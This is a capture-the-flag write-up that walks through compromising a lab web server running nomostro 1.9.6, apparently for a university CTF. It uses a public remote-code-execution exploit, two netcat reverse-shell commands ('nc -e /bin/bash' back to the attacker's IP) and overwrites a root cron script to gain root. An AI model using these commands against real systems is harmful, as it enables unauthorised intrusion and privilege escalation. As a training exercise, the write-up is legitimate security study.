## My First Blog
### Category : Network/Pentest

This was a pretty interesting challenge, a proper HackTheBox style, where you need root access to get the flag. 

So we start by logging into our given VPN using the OVPN profile.

We also know the IP of the blog. `http://172.30.0.2/`

So, we start by running a nmap serivec and port scan of the host.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nostromo 1.9.6
|_http-generator: Hugo 0.54.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: My first blog!
```

Checking out the page, we don't find anything interesting. But, the server `nostromo 1.9.6` from the nmap scan seems like the target, and searchsploit seems to agree.

```
searchsploit nostromo
--------------------------------------------- ----------------------------------
 Exploit Title                               |  Path
                                             | (/opt/exploitdb/)
--------------------------------------------- ----------------------------------
Nostromo - Directory Traversal Remote Comman | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution       | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal  | exploits/linux/remote/35466.sh
--------------------------------------------- ----------------------------------
Shellcodes: No Result
```

So, we have a RCE vulnerability with the server. 

Using the exploit to test it's working
```
$ python exploit.py 172.30.0.2 80 ls


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    


HTTP/1.1 200 OK
Date: Sun, 22 Mar 2020 07:39:31 GMT
Server: nostromo 1.9.6
Connection: close


bash
bunzip2
bzcat
bzcmp
bzdiff
bzegrep
bzexe
bzfgrep
bzgrep
bzip2
bzip2recover
bzless
bzmore
cat
chgrp
chmod
chown
cp
dash
date
dd
df
dir
dmesg
dnsdomainname
domainname
echo
egrep
false
fgrep
findmnt
grep
gunzip
gzexe
gzip
hostname
kill
ln
login
ls
lsblk
mkdir
mknod
mktemp
more
mount
mountpoint
mv
nc
nc.traditional
netcat
nisdomainname
pidof
ps
pwd
rbash
readlink
rm
rmdir
run-parts
sed
sh
sh.distrib
sleep
stty
su
sync
tar
tempfile
touch
true
umount
uname
uncompress
vdir
wdctl
which
ypdomainname
zcat
zcmp
zdiff
zegrep
zfgrep
zforce
zgrep
zless
zmore
znew
```

So I use this exploit to get a more permanent reverse shell. Since we have nc available,
I use the payload 

On the remote machine
```
nc -e /bin/bash 172.30.0.14 1234
```

On my host
```
nc -lvp 1234
```

Since our aim is to get a root access, I use the [LinuxSmartEnum.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) script. 

To upload the script we need a writable directory.

```
find /var/nostromo -writable
./logs
./logs/access_log
./logs/nhttpd.pid
./conf
./conf/mimes
./conf/nhttpd.conf-dist
./conf/nhttpd.conf
./htdocs
./htdocs/nostromo.gif
./htdocs/cgi-bin
./icons
./icons/file.gif
./icons/dir.gif
```

I use the logs directory for now. 

To upload the script, I use netcat to do the job. 

On Machine 
```
nc -lvp 1234 -q1 > lse.sh < /dev/null
```

On my host 
```
cat lse.sh | nc 172.30.0.2 1234
```

On running lse.sh we find 

```
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:* * * * * root /usr/bin/healthcheck
---
[i] ret400 Cron files...................................................... skip
```

So we can write to /usr/bin where healthcheck is present, and is executed by root every minute as a cronjob! 

So we `echo "nc -e /bin/sh 172.30.0.14 1235" > healthcheck` and run a nc listener on our host.

Wait for a minute.....


```
$ nc -lvp 1235
Listening on [0.0.0.0] (family 0, port 1235)
ls
Connection from 172.30.0.2 40926 received!
flag.txt
cat flag.txt
gigem{l1m17_y0ur_p3rm15510n5}
```

And done!